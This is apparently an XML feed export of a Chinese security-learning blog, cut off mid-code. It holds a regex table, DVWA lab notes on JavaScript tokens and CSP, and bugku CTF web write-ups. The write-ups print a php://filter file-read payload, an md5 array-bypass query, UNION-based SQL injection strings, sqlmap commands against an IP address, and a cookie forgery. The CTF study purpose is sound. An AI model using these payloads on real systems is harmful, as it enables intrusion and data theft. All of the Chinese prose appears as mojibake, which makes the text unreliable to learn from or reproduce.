å¯ä»¥åŒ¹é… â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å°å†™å­—æ¯å­—ç¬¦ã€‚</td></tr><tr><td>[^a-z]</td><td>è´Ÿå€¼å­—ç¬¦èŒƒå›´ã€‚åŒ¹é…ä»»ä½•ä¸åœ¨æŒ‡å®šèŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚ä¾‹å¦‚ï¼Œâ€™[ ^a-z]â€™ å¯ä»¥åŒ¹é…ä»»ä½•ä¸åœ¨ â€˜aâ€™ åˆ° â€˜zâ€™ èŒƒå›´å†…çš„ä»»æ„å­—ç¬¦ã€‚</td></tr><tr><td>*</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚</td></tr><tr><td>+</td><td>åŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼ä¸€æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™zo+â€™ èƒ½åŒ¹é… â€œzoâ€ ä»¥åŠ â€œzooâ€ï¼Œä½†ä¸èƒ½åŒ¹é… â€œzâ€ã€‚+ ç­‰ä»·äº {1,}ã€‚</td></tr><tr><td>{n}</td><td>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚åŒ¹é…ç¡®å®šçš„ n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†æ˜¯èƒ½åŒ¹é… â€œfoodâ€ ä¸­çš„ä¸¤ä¸ª oã€‚</td></tr><tr><td>{n,}</td><td>n æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚è‡³å°‘åŒ¹é…n æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€™o{2,}â€™ ä¸èƒ½åŒ¹é… â€œBobâ€ ä¸­çš„ â€˜oâ€™ï¼Œä½†èƒ½åŒ¹é… â€œfooooodâ€ ä¸­çš„æ‰€æœ‰ oã€‚â€™o{1,}â€™ ç­‰ä»·äº â€˜o+â€™ã€‚â€™o{0,}â€™ åˆ™ç­‰ä»·äº â€˜o*â€™ã€‚</td></tr><tr><td>{n,m}</td><td>m å’Œ n å‡ä¸ºéè´Ÿæ•´æ•°ï¼Œå…¶ä¸­n &lt;= mã€‚æœ€å°‘åŒ¹é… n æ¬¡ä¸”æœ€å¤šåŒ¹é… m æ¬¡ã€‚ä¾‹å¦‚ï¼Œâ€o{1,3}â€ å°†åŒ¹é… â€œfoooooodâ€ ä¸­çš„å‰ä¸‰ä¸ª oã€‚â€™o{0,1}â€™ ç­‰ä»·äº â€˜o?â€™ã€‚è¯·æ³¨æ„åœ¨é€—å·å’Œä¸¤ä¸ªæ•°ä¹‹é—´ä¸èƒ½æœ‰ç©ºæ ¼ã€‚</td></tr><tr><td><strong>.</strong></td><td><strong>åŒ¹é…ä»»ä½•å­—ç¬¦</strong>ï¼Œæ¢è¡Œç¬¦ï¼ˆ\nã€\rï¼‰é™¤å¤–ã€‚</td></tr></tbody></table></li><li><p>PHPçš„æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸€äº›å†…ç½®çš„é€šç”¨å­—ç¬¦ç°‡ï¼Œåˆ—è¡¨å¦‚ä¸‹ï¼š</p></li></ul><table><thead><tr><th>å­—ç¬¦ç°‡</th><th>æè¿°</th></tr></thead><tbody><tr><td>[[:alpha:]]</td><td>ä»»ä½•å­—æ¯</td></tr><tr><td>[[:digit:]]</td><td>ä»»ä½•æ•°å­—</td></tr><tr><td>[[:alnum:]]</td><td>ä»»ä½•å­—æ¯å’Œæ•°å­—</td></tr><tr><td>[[:space:]]</td><td>ä»»ä½•ç©ºç™½å­—ç¬¦</td></tr><tr><td>[[:upper:]]</td><td>ä»»ä½•å¤§å†™å­—æ¯</td></tr><tr><td>[[:lower:]]</td><td>ä»»ä½•å°å†™å­—æ¯</td></tr><tr><td>[[:punct:]]</td><td>ä»»ä½•æ ‡ç‚¹ç¬¦å·</td></tr><tr><td>[[:xdigit:]]</td><td>ä»»ä½•16è¿›åˆ¶çš„æ•°å­—ï¼Œç›¸å½“äº[0-9a-fA-F]</td></tr></tbody></table><p>spï¼š phpçš„æ­£åˆ™è¡¨è¾¾å¼éœ€è¦æ”¾åœ¨<code>//</code> ä¹‹é—´</p><p>å‚è€ƒï¼š<a href="https://www.runoob.com/regexp/regexp-tutorial.html">https://www.runoob.com/regexp/regexp-tutorial.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;æ­£åˆ™è¡¨è¾¾å¼ï¼š&quot;&gt;&lt;a href=&quot;#æ­£åˆ™è¡¨è¾¾å¼ï¼š&quot; class=&quot;headerlink&quot; title=&quot;æ­£åˆ™è¡¨è¾¾å¼ï¼š&quot;&gt;&lt;/a&gt;æ­£åˆ™è¡¨è¾¾å¼ï¼š&lt;/h4&gt;&lt;p&gt;æè¿°äº†ä¸€ç§å­—ç¬¦ä¸²åŒ¹é…çš„æ¨¡å¼ï¼ˆpatternï¼‰ï¼Œå¯ä»¥ç”¨æ¥æ£€æŸ¥ä¸€ä¸ªä¸²æ˜¯å¦å«æœ‰æŸç§å­ä¸²ã€å°†åŒ¹é…çš„å­ä¸²æ›¿æ¢æˆ–è€…ä»æŸä¸ª</summary>
      
    
    
    
    
    <category term="åˆ·é¢˜" scheme="http://example.com/tags/%E5%88%B7%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>JS</title>
    <link href="http://example.com/2021/03/18/DVWA%E2%80%94JS/"/>
    <id>http://example.com/2021/03/18/DVWA%E2%80%94JS/</id>
    <published>2021-03-18T10:52:29.000Z</published>
    <updated>2021-03-18T12:19:36.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€ï¼š"><a href="#å‰è¨€ï¼š" class="headerlink" title="å‰è¨€ï¼š"></a>å‰è¨€ï¼š</h1><p>javascriptä¸€ç§å¸¸ç”¨äºé¡µé¢ä»£ç ä¸­ï¼Œç”¨æ¥å®ç°åŠ¨æ€æ•ˆæœçš„è„šæœ¬è¯­è¨€ã€‚ç”±äºJSæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥è¿‡åˆ†ä¾èµ–JSä»£ç é€»è¾‘ï¼Œå®¹æ˜“è¢«æ”»å‡»è€…è·å–ä»£ç åï¼Œè¿›è¡Œæ•°æ®ä¼ªé€ ã€‚</p><h1 id="Lowï¼š"><a href="#Lowï¼š" class="headerlink" title="Lowï¼š"></a>Lowï¼š</h1><p>å…ˆæäº¤é»˜è®¤æ•°æ®<img src="/DVWA%E2%80%94JS/1.png" alt="1"></p><p>æäº¤<code>success</code><img src="/DVWA%E2%80%94JS/2.png" alt="2"></p><p>æ— æ•ˆçš„tokenæ€ä¹ˆå›äº‹å‘¢ï¼ŸæŸ¥çœ‹ç½‘é¡µæºç </p><p><img src="/DVWA%E2%80%94JS/3.png" alt="3"></p><p><img src="/DVWA%E2%80%94JS/4.png" alt="4"></p><p>æˆ‘ä»¬çœ‹åˆ°tokenç”±å‰ç«¯ç”Ÿæˆï¼Œä¸æœåŠ¡å™¨æ— å…³ï¼Œä½†æ˜¯å‰ç«¯çš„tokenæ˜¯æ ¹æ®<code>ChangeMe</code>æ¥ç”Ÿæˆçš„ï¼Œè€ŒæœåŠ¡å™¨è¦çš„tokenæ˜¯æ ¹æ®<code>success</code>ç”Ÿæˆçš„ã€‚</p><p>åˆ©ç”¨æ§åˆ¶å°æ‰§è¡Œä»£ç </p><p><img src="/DVWA%E2%80%94JS/5.png" alt="5"></p><p><img src="/DVWA%E2%80%94JS/6.png" alt="6"></p><p>æˆ‘ä»¬å°†ç®­å·æ‰€æŒ‡çš„tokençš„å€¼ç”¨ä¸Šé¢å¼¹æ¡†ä¸­çš„å€¼æ›¿æ¢<img src="/DVWA%E2%80%94JS/7.png" alt="7"></p><h1 id="Mediumï¼š"><a href="#Mediumï¼š" class="headerlink" title="Mediumï¼š"></a>Mediumï¼š</h1><p><a href="http://www.bubuko.com/infodetail-2905900.html">http://www.bubuko.com/infodetail-2905900.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€ï¼š&quot;&gt;&lt;a href=&quot;#å‰è¨€ï¼š&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€ï¼š&quot;&gt;&lt;/a&gt;å‰è¨€ï¼š&lt;/h1&gt;&lt;p&gt;javascriptä¸€ç§å¸¸ç”¨äºé¡µé¢ä»£ç ä¸­ï¼Œç”¨æ¥å®ç°åŠ¨æ€æ•ˆæœçš„è„šæœ¬è¯­è¨€ã€‚ç”±äºJSæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯ï¼Œæ‰€ä»¥è¿‡åˆ†ä¾èµ–JSä»£ç é€»è¾‘ï¼Œå®¹æ˜“è¢«æ”»å‡»è€…</summary>
      
    
    
    
    
    <category term="DVWAâ€”labs" scheme="http://example.com/tags/DVWA%E2%80%94labs/"/>
    
  </entry>
  
  <entry>
    <title>CSP</title>
    <link href="http://example.com/2021/03/18/DVWA%E2%80%94CSP/"/>
    <id>http://example.com/2021/03/18/DVWA%E2%80%94CSP/</id>
    <published>2021-03-18T10:40:08.000Z</published>
    <updated>2021-03-18T10:51:44.818Z</updated>
    
    <content type="html"><![CDATA[<p>Content-Security-PolicyæŒ‡çš„æ˜¯å†…å®¹å®‰å…¨æ£€æµ‹ï¼Œåˆç§°ç½‘é¡µå®‰å…¨æ”¿ç­–ï¼ŒCSPçš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ã€‚</p><p>Content-Security-Policyï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰æ˜¯æŒ‡HTTPè¿”å›æŠ¥æ–‡å¤´ä¸­çš„æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šæ ¹æ®æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œåˆ¤æ–­å“ªäº›èµ„æºå¯ä»¥åŠ è½½æˆ–æ‰§è¡Œã€‚æ˜¯ä¸ºäº†ç¼“è§£æ½œåœ¨çš„è·¨ç«™è„šæœ¬é—®é¢˜ï¼ˆXSSï¼‰ã€‚åŸæ¥åº”å¯¹XSSæ”»å‡»æ—¶ï¼Œä¸»è¦é‡‡ç”¨å‡½æ•°è¿‡æ»¤ã€è½¬ä¹‰è¾“å…¥ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€æ ‡ç­¾ã€æ–‡æœ¬æ¥è§„é¿æ”»å‡»ã€‚CSPçš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ï¼Œå¼€å‘äººå‘˜æ˜ç¡®å‘Šè¯‰å®¢æˆ·ç«¯ï¼Œå“ªäº›å¤–éƒ¨èµ„æºå¯ä»¥åŠ è½½å’Œæ‰§è¡Œã€‚å¼€å‘è€…åªéœ€è¦æä¾›é…ç½®ï¼Œå®ç°å’Œæ‰§è¡Œå…¨éƒ¨ç”±æµè§ˆå™¨å®Œæˆã€‚ç®€è€Œè¨€ä¹‹å°±æ˜¯åœ¨å‰ç«¯æ·»åŠ ä¸€äº›æ ‡ç­¾ï¼Œå‘Šè¯‰æµè§ˆå™¨å“ªäº›èµ„æºå¯ä»¥åŠ è½½è®¿é—®ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Content-Security-PolicyæŒ‡çš„æ˜¯å†…å®¹å®‰å…¨æ£€æµ‹ï¼Œåˆç§°ç½‘é¡µå®‰å…¨æ”¿ç­–ï¼ŒCSPçš„å®è´¨å°±æ˜¯ç™½åå•åˆ¶åº¦ã€‚&lt;/p&gt;
&lt;p&gt;Content-Security-Policyï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰æ˜¯æŒ‡HTTPè¿”å›æŠ¥æ–‡å¤´ä¸­çš„æ ‡ç­¾ï¼Œæµè§ˆå™¨ä¼šæ ¹æ®æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œåˆ¤æ–­å“ªäº›èµ„æºå¯ä»¥åŠ è½½æˆ–æ‰§è¡Œ</summary>
      
    
    
    
    
    <category term="dvwaâ€”labs" scheme="http://example.com/tags/dvwa%E2%80%94labs/"/>
    
  </entry>
  
  <entry>
    <title>bugku(1)</title>
    <link href="http://example.com/2021/03/16/bugku1/"/>
    <id>http://example.com/2021/03/16/bugku1/</id>
    <published>2021-03-16T14:56:40.000Z</published>
    <updated>2021-07-12T11:09:37.595Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰"><a href="#web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰" class="headerlink" title="web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰"></a>web11ï¼šï¼ˆå¾¡å‰‘æ‰«æåç«¯ï¼‰</h1><p> è¿™é¢˜çš„é¢˜ç›®æ˜¯ï¼šç½‘ç«™è¢«é»‘äº† é»‘å®¢ä¼šä¸ä¼šç•™ä¸‹åé—¨</p><p>é‚£ä¹ˆæˆ‘ä»¬è¦å€ŸåŠ©å¾¡å‰‘è¿™ä¸ªåé—¨æ‰«æå·¥å…·ï¼Œæ‰«æç›®æ ‡ç½‘ç«™ï¼Œå‘ç°æœ‰ä¸ªshell.phpæ–‡ä»¶<img src="/bugku/1.png" alt="1"></p><p>è®¿é—®shell.php<img src="/bugku/2.png" alt="2"></p><p>ç”¨bpæŠ“åŒ…çˆ†ç ´å¯çŸ¥å¯†ç ä¸º<code>hack</code></p><p><img src="/bugku/3.png" alt="3"></p><p>passä¸ºhackï¼Œç™»å…¥<img src="/bugku/4.png" alt="4"></p><h1 id="web13ï¼šï¼ˆurlè§£ç ï¼‰"><a href="#web13ï¼šï¼ˆurlè§£ç ï¼‰" class="headerlink" title="web13ï¼šï¼ˆurlè§£ç ï¼‰"></a>web13ï¼šï¼ˆurlè§£ç ï¼‰</h1><p>é¢˜ç›®å«æˆ‘ä»¬çœ‹çœ‹æºç ï¼Œæˆ‘ä»¬çœ‹çœ‹æºç ï¼š</p><p><img src="/bugku/5.png" alt="5"></p><p>æˆ‘ä»¬å¯¹å…¶urlè§£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSubmit</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> a=document.getElementById(<span class="string">&quot;password&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&quot;undefined&quot;</span>!=typeof a)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;</span>==a.value)</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">0</span>;</span><br><span class="line">       alert(<span class="string">&quot;Error&quot;</span>);</span><br><span class="line">       a.focus();</span><br><span class="line">       <span class="keyword">return</span>!<span class="number">1</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">&quot;levelQuest&quot;</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure><p>æäº¤å­—ç¬¦ä¸²<code>67d709b2b54aa2aa648cf6e87a7114f1</code></p><p><img src="/bugku/6.png" alt="6"></p><h1 id="web14ï¼šï¼ˆæ–‡ä»¶åŒ…å«åŠ php-filterï¼‰"><a href="#web14ï¼šï¼ˆæ–‡ä»¶åŒ…å«åŠ php-filterï¼‰" class="headerlink" title="web14ï¼šï¼ˆæ–‡ä»¶åŒ…å«åŠ php://filterï¼‰"></a>web14ï¼šï¼ˆæ–‡ä»¶åŒ…å«åŠ php://filterï¼‰</h1><p>è¿›å…¥é¢˜ç›®ï¼Œçœ‹åˆ°<img src="/bugku/15.png" alt="15"></p><p>ç‚¹å‡»<code>click meï¼Ÿ no</code>è·³è½¬<img src="/bugku/16.png" alt="16"></p><p>å‘ç°æ˜¯æ–‡ä»¶åŒ…å«é¢˜ã€‚</p><ul><li><strong>è¡¥å……</strong></li></ul><ol><li>include()å‡½æ•°å¯¹æ–‡ä»¶åç¼€åæ— è¦æ±‚ï¼Œè€Œå¯¹å…¶ä¸­çš„è¯­æ³•æœ‰è¦æ±‚ï¼Œå³ä½¿åç¼€åä¸ºtxtï¼Œjpgä¹Ÿä¼šè¢«å½“åšphpæ–‡ä»¶è§£æï¼Œåªè¦æ–‡ä»¶å†…æ˜¯<?php ?>å½¢å¼å°±å¯ä»¥æ‰§è¡Œï¼Œä½†æ˜¯å¦‚æœä¸æ˜¯phpè¯­æ³•çš„å½¢å¼ï¼Œå³ä½¿åç¼€ä¸ºphpï¼Œä¹Ÿæ— æ³•æ‰§è¡Œã€‚</li><li><strong>php://filter</strong> è®¾è®¡ç”¨æ¥è¿‡æ»¤ç­›é€‰æ–‡ä»¶ã€‚å¦‚æœæƒ³è¦è¯»å–è¿è¡Œphpæ–‡ä»¶çš„æºç ï¼Œéœ€è¦å…ˆå¯¹è¯¥phpæ–‡ä»¶å†…å®¹base64ç¼–ç ï¼Œå†ä¼ å…¥includeå‡½æ•°ï¼Œè¿™æ ·å°±ä¸ä¼šè¢«è®¤ä¸ºæ˜¯phpä»£ç ï¼Œä¸ä¼šæ‰§è¡Œï¼Œä¼šè¾“å‡ºæ–‡ä»¶çš„base64ç¼–ç ï¼Œåç»­å†è§£ç å³å¯è·å¾—æºç ã€‚</li></ol><p>æ•…æœ¬é¢˜payloadä¸ºï¼š<code>php://filter/read=convert.base64-encode/resource=index.php</code></p><p><img src="/bugku/17.png" alt="17"></p><p>base64è§£ç ï¼š<img src="/bugku/18.png" alt="18"></p><p>å‚è€ƒåšå®¢:</p><p><code>https://blog.csdn.net/zpy1998zpy/article/details/80598768</code></p><p><code>https://www.freebuf.com/column/148886.html</code></p><h1 id="web16ï¼šï¼ˆMD5-å‡½æ•°ç»•è¿‡ï¼‰"><a href="#web16ï¼šï¼ˆMD5-å‡½æ•°ç»•è¿‡ï¼‰" class="headerlink" title="web16ï¼šï¼ˆMD5()å‡½æ•°ç»•è¿‡ï¼‰"></a>web16ï¼šï¼ˆMD5()å‡½æ•°ç»•è¿‡ï¼‰</h1><p>è¿›å…¥ç¯å¢ƒåå‘ç°å°±ä¸€ä¸²æ•°å­—ï¼Œå…¶ä»–ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œæ£€æŸ¥ç½‘é¡µæºç ï¼ŒæŠ“åŒ…çœ‹å›æ˜¾éƒ½æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢ï¼Œåˆç”¨å¾¡å‰‘æ‰«æç½‘é¡µåå°</p><p><img src="/bugku/7.png" alt="7"></p><p>å‘ç°ä¸€ä¸ª.bakæ‹“å±•åï¼ˆbakè¿™ç§å¤‡ä»½æ–‡ä»¶åœ¨æˆ‘ä»¬å¹³å¸¸ä½¿ç”¨ç»˜å›¾ã€ç¼–ç¨‹è½¯ä»¶æ—¶éƒ½ä¼šé»˜è®¤åˆ›å»ºå¤‡ä»½æ–‡ä»¶ï¼Œå¦‚cadæ–‡ä»¶ä¿®æ”¹åä¼šäº§ç”Ÿbakæ–‡ä»¶ï¼Œwpsã€wordç­‰æ–‡ä»¶ä¿®æ”¹åä¹Ÿéƒ½ä¼šäº§ç”Ÿbakå¤‡ä»½æ–‡ä»¶ï¼Œè¿™æ ·å¯ä»¥ä¿è¯å½“æºæ–‡ä»¶ä¸å°å¿ƒè¢«åˆ æ‰æˆ–è€…å‡ºç°æ•…éšœå¯¼è‡´æ— æ•…è‡ªåŠ¨é€€å‡ºæ—¶ï¼Œè¿˜å¯ä»¥ä»bakå¤‡ä»½æ–‡ä»¶ç»§ç»­ç¼–è¾‘ï¼Œå‡å°‘äº†ä¸å°‘è¯¯æ“ä½œå¸¦æ¥çš„æŸå¤±ã€‚ï¼‰çš„æ–‡ä»¶ï¼Œç»“åˆæè¿°çš„ä¿¡æ¯ï¼šå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹è¿™ä¸ª.bakæ‹“å±•åæ–‡ä»¶åº”è¯¥æœ‰ä¸œè¥¿</p><p>ä¸‹è½½æ–‡ä»¶å¹¶æ‰“å¼€<img src="/bugku/35@%25PWPHHUMJX79WMRZM%5B_5.png" alt="img"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°key1å’Œkey2æœ¬èº«ä¸èƒ½ç›¸ç­‰ï¼Œä½†æ˜¯è¢«md5ç¼–ç åä¸¤è€…è¦ç›¸ç­‰æ‰èƒ½å¾—åˆ°flagã€‚</p><p>æ€»çš„æ¥è¯´è¿™æ˜¯ä¸€é“æ–‡ä»¶åŒ…å«æ¼æ´+ç»•è¿‡å­—ç¬¦ä¸²è¿‡æ»¤+ç»•è¿‡md5ç¼–ç çš„é¢˜</p><p>æˆ‘ä»¬ç”¨åŒå†™ç»•è¿‡å­—ç¬¦ä¸²è¿‡æ»¤ï¼Œåˆ©ç”¨md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼ˆå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULL,ä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚ï¼‰è¾¾æˆifæ¡ä»¶ã€‚</p><p>å› æ­¤æˆ‘ä»¬çš„payloadæ˜¯<code>?kekeyy1[]=1&amp;kekeyy2[]=2</code></p><p><img src="/bugku/8.png" alt="8"></p><h1 id="web17-sqlæ³¨å…¥â€”â€”postå‹"><a href="#web17-sqlæ³¨å…¥â€”â€”postå‹" class="headerlink" title="web17:(sqlæ³¨å…¥â€”â€”postå‹)"></a>web17:(sqlæ³¨å…¥â€”â€”postå‹)</h1><h3 id="1-æ‰‹å·¥æ³¨å…¥ï¼š"><a href="#1-æ‰‹å·¥æ³¨å…¥ï¼š" class="headerlink" title="1.æ‰‹å·¥æ³¨å…¥ï¼š"></a>1.æ‰‹å·¥æ³¨å…¥ï¼š</h3><p>æŸ¥æ•°å­—æ®µå€¼ï¼š0â€™ union select 1,2,3,4#</p><p>çˆ†åº“ï¼š0â€™ union select 1,2,3,database()#</p><p>çˆ†è¡¨ï¼š0â€™ union select 1,2,3,group_concat(table_name) from information_schema.talbes where table_schema=â€™skctfâ€™#</p><p>çˆ†åˆ—ï¼š0â€™ union select 1,2,3,group_concat(column_name) from information_schema.tables where table_name=fl4g#</p><p>çˆ†å€¼ï¼š0â€™ union select 1,2,3,skctf_flag form fl4g#</p><h3 id="2-sqlmap"><a href="#2-sqlmap" class="headerlink" title="2.sqlmap"></a>2.sqlmap</h3><p>çˆ†åº“ï¼š<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; --current-db</code></p><p>çˆ†è¡¨ï¼š<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf --tables</code></p><p>çˆ†åˆ—ï¼š<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g --columns</code></p><p>çˆ†å€¼ï¼š<code>sqlmap.py -u &quot;http://114.67.246.176:12115&quot; --batch --data &quot;id=1&quot; -D skctf -T fl4g -C skctf_flag --dump </code></p><h1 id="Web20ï¼ˆlineæ§åˆ¶è¿”å›å†…å®¹ï¼‰"><a href="#Web20ï¼ˆlineæ§åˆ¶è¿”å›å†…å®¹ï¼‰" class="headerlink" title="Web20ï¼ˆlineæ§åˆ¶è¿”å›å†…å®¹ï¼‰"></a>Web20ï¼ˆlineæ§åˆ¶è¿”å›å†…å®¹ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€å‘ç°æ˜¯ä¸€å †ä¹±ç ï¼Œæˆ‘è¿˜ä»¥ä¸ºä¹±ç é‡Œé¢æœ‰å†…å®¹ï¼Œåˆ†æäº†ä¸€é€šï¼Œç»“æœä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚</p><p>æ³¨æ„åˆ°urlæ filenameçš„å€¼å¥½åƒè¢«ç¼–ç äº†ï¼Œbase64è§£ç å¾—keys.txtã€‚<img src="/bugku/12.png" alt="12"></p><ul><li>å˜é‡lineçš„å€¼ä¸ºå¤šå°‘å°±è¿”å›æŒ‡å®šæ–‡ä»¶ä¸­ç¬¬å‡ è¡Œï¼Œæ— å€¼æ—¶é»˜è®¤è¿”å›ç¬¬0è¡Œ</li></ul><p>ä¸€èˆ¬index.phpéƒ½ä¼šå­˜åœ¨æºç ï¼Œç¼–ç index.php</p><p><img src="/bugku/13.png" alt="13"></p><p>è¿”å›index.phpç¬¬ä¸€è¡Œæºç ï¼Œåªè¦ä¸æ–­æ›´æ”¹lineçš„å€¼æœ€ç»ˆå°±å¯ä»¥è·å¾—å®Œæ•´çš„index.phpæºç ï¼ˆå› ä¸ºæˆ‘ä¸ä¼šå†™pythonè„šæœ¬ï¼‰</p><p>index.phpæºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])?$_GET[<span class="string">&#x27;filename&#x27;</span>]:<span class="string">&quot;&quot;</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">&#x27;line&#x27;</span>])?intval($_GET[<span class="string">&#x27;line&#x27;</span>]):<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">&#x27;&#x27;</span>) header(<span class="string">&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;0&#x27;</span> =&gt;<span class="string">&#x27;keys.txt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1&#x27;</span> =&gt;<span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">&#x27;keys.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);</span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹åˆ°å½“cookieå†…å®¹ä¸ºå‚æ•°margin=marginæ—¶ï¼Œfile_listæ•°ç»„ä¼šå¤šä¸€ä¸ªé”®å€¼<code>keys.php</code>ï¼Œç„¶åé€šè¿‡in_arrayå‡½æ•°æ£€æµ‹æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯å¦åœ¨file_listæ•°ç»„ä¸­ï¼Œæ˜¯åˆ™å‘é€key.phpæ–‡ä»¶çš„å†…å®¹ã€‚</p><p>å› æ­¤æˆ‘ä»¬æ„é€ cookieï¼šmargin=marginï¼Œä»¤filenameçš„å€¼ä¸ºkey.php  base64ç¼–ç åçš„å€¼ã€‚<img src="/bugku/14.png" alt="14"></p><h1 id="web21ï¼šï¼ˆç¼–ç -åŠ æ¡ä»¶ç»•è¿‡ï¼‰"><a href="#web21ï¼šï¼ˆç¼–ç -åŠ æ¡ä»¶ç»•è¿‡ï¼‰" class="headerlink" title="web21ï¼šï¼ˆç¼–ç +åŠ æ¡ä»¶ç»•è¿‡ï¼‰"></a>web21ï¼šï¼ˆç¼–ç +åŠ æ¡ä»¶ç»•è¿‡ï¼‰</h1><p>æ‰“å¼€é¢˜ç›®åœ°å€åšçš„ç¬¬ä¸€ä»¶å°±æ˜¯æŸ¥çœ‹ç½‘é¡µæºç <img src="/bugku/9.png" alt="9"></p><p>å‘ç°æœ‰ä¸€ä¸ª1p.htmlæ–‡ä»¶ï¼Œæ‰“å¼€æ˜¯ä¸€æ®µHTMLä»£ç </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 